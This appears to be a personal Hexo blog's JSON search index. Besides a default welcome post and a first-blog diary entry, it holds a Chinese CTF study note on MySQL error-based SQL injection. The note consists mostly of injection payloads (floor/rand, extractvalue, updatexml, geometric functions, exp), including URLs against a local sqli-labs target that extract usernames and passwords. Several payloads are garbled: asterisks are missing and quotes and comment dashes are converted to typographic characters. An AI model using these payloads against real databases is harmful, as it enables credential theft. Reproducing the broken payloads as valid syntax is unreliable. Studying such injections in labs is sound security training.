[{"title":"Hello World","url":"/2024/03/28/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"报错注入","url":"/2024/03/30/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","content":"1.floor函数注入  select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a); http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ union select 1,count(),concat((floor(rand(0)*2)),’–’,(select concat(id,’-‘,username,’-‘,password) from security.users limit 0,1))x from information_schema.tables group by x%23 –SQL注入：floor报错注入的形成原理分析_floor 报错注入-CSDN博客\n\npayload是在中间concat部分，修改该部分可以执行不同命令\n只能用concat连接 ，group_concat不行，且每次只能显示一条数据\n要让上述的报错实现，数据库至少要3条数据\n使用注意\n运用\ncount():查询数量\nrand()：产生0~1间的随机数\nfloor()：向下取整\ngroup by：按指定分类\n函数介绍\n写法\n\n2.extractvalue函数注入\n\n使用注意\nMySQL 5.1.5版本以上才支持该函数\n返回的数据限制为32位\n可以用substring函数进行数据位移偏转 http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ and (extractvalue(1,concat(0x7e,(select substring(group_concat(username),1) from users),0x7e)))–+\n对XML文档进行查询\nEXTRACTVALUE (XML_document, XPath_string);\n第一个参数：XML_document是String格式，为XML文档对象的名称\n第二个参数：XPath_string (Xpath格式的字符串)\n作用：从目标XML中返回包含所查询值的字符串\n函数介绍\n写法 select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n运用 http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ and (extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e)))–+\n\n3.updatexml函数注入\n\nMySQL 5.1.5版本以上才支持该函数\n返回的数据限制为32位\n可以用substring函数进行数据位移偏转\n使用注意\n对XML文档进行修改\nUPDATEXML (XML_document, XPath_string, new_value);\n第一个参数：XML_document是String格式，为XML文档对象的名称\n第二个参数：XPath_string (Xpath格式的字符串)\n第三个参数：new_value，String格式，替换查找到的符合条件的数据\n作用：改变文档中符合条件的节点的值\n函数介绍\n写法 select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n运用 http://localhost/sqlilabs2/Less-5/index.php?id=-1‘ and (updatexml(1,concat(0x7e,(select SUBSTRING(group_concat(username),12) from users),0x7e),1))–+\n\n4.geometrycollection函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n5.multipoint函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n6.polygon函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n7.multipolygon函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n8.linestring函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n9.multilinestring函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));\n运用\n使用注意\n\n10.exp函数注入\n\n函数介绍\n写法 select * from test where id&#x3D;1 and exp(~(select * from(select user())a));\n运用\n使用注意\n\n","categories":["CTF"],"tags":["sql注入"]},{"title":"my_first_blog","url":"/2024/03/29/my-first-blog/","content":"第一次搭建博客，前前后后不知道用了多长时间，之前一段时间就开始搭建了，但是不知道什么原因网页没有渲染，于是就丢下了这个，最近又重新开始了，在尝试很长时间后，终于给弄出来了，太不容易了，哈哈！\n","categories":["Example"],"tags":["words first"]}]